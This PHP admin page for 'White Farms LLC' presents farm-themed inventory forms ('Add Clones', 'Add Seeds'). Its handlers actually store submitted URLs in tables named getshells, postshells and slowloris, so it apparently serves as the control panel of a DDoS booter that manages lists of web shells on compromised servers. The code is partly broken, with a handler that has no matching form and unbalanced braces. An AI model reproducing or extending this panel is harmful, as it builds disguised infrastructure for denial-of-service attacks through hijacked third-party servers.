<?php
require 'header.php';
?>
<head>
<link href="./images/styles.css" rel="stylesheet" type="text/css">
<title>White Farms LLC</title>
</head>
    <?php if (checkAdmin()) { ?>
<li><h2><strong>Important Notice To All Employees</strong></h2>
				<div class="box">
				<form>
		       <h3><span style="color:red ;align:center" >Here you can make changes to the inventory. Please note that you may add
			   more than one item at a time.  To do this please hit enter after each item
			   the cursor should go to a new line, then continue adding items.</span></h3><br/>
				</form></div></li>
				
				<div class="box">
				<li><h2><strong>Current Stock</strong></h2>
				<form>
				<?php 
				echo "Not Currently Working"; ?><br/>
				<?php echo "Current Clones In Stock: ";?><br/>
				<?php echo "Current Seends In Stock:";?><br/>

				</form>
				</div>
     <div class="box">
 <li><h2><strong>Add Clones</strong></h2>
    <div class="box-content">
<center>
<form name="frmcontadd" action="" method="post">

  <textarea class="entryField" name="url" cols=115 rows=10 style="background:#4D4D4D; color: #27AE60;size:15px;" ></textarea><br/><br/>
  <input  type="submit" name="Submit" value="Add Clones" class="btn" ><br/><br/>

</form>
</center>
</div>
</div> </li>
<div class="box">
 <li><h2><strong>Add Seeds</strong></h2>
    <div class="box-content">
<center>
<form name="frmcontadd" action="" method="post">

  <textarea class="entryfield" name="url2" cols=115 rows=10 style="background:#4D4D4D; color: #27AE60;"></textarea><br/><br/>
  <input  type="submit" name="Submit2" value="Add Seeds" class="btn"><br/><br/>

</form>
</center>
</div>
</div></li>

</div>
<?php
// first the check of a submitted form
if (isset($_POST['Submit'])) {
  $hosts = explode("\r\n", $_POST['url']);
  // let's create the INSERT query
  $values = array();
  foreach ($hosts as $host) {
    $values[] .= "('" . mysql_real_escape_string($host) . "')";
  }
  $query = "INSERT INTO getshells (url) VALUES " . implode(',', $values);
  $result = mysql_query($query) or die("mysql error " . mysql_error() . " in query $query");
  echo '<hr>Successfully added GET Shells to the shells database.';
}

// then the form itself
?>

<?php
// first the check of a submitted form
if (isset($_POST['Submit2'])) {
  $hosts2 = explode("\r\n", $_POST['url2']);
  // let's create the INSERT query
  $values = array();
  foreach ($hosts2 as $host2) {
    $values[] .= "('" . mysql_real_escape_string($host2) . "')";
  }
  $query = "INSERT INTO postshells (url) VALUES " . implode(',', $values);
  $result = mysql_query($query) or die("mysql error " . mysql_error() . " in query $query");
  echo '<hr>Successfully added POST Shells to the shells database.';
}
}
// then the form itself
?>
<?php
// first the check of a submitted form
if (isset($_POST['Submit3'])) {
  $hosts3 = explode("\r\n", $_POST['url3']);
  // let's create the INSERT query
  $values = array();
  foreach ($hosts3 as $host3) {
    $values[] .= "('" . mysql_real_escape_string($host3) . "')";
  }
  $query = "INSERT INTO slowloris (url) VALUES " . implode(',', $values);
  $result = mysql_query($query) or die("mysql error " . mysql_error() . " in query $query");
  echo '<hr>Successfully added Slowloris Shells to the shells database.';
}

// then the form itself
?>

<?php
include 'footer.php';
?>
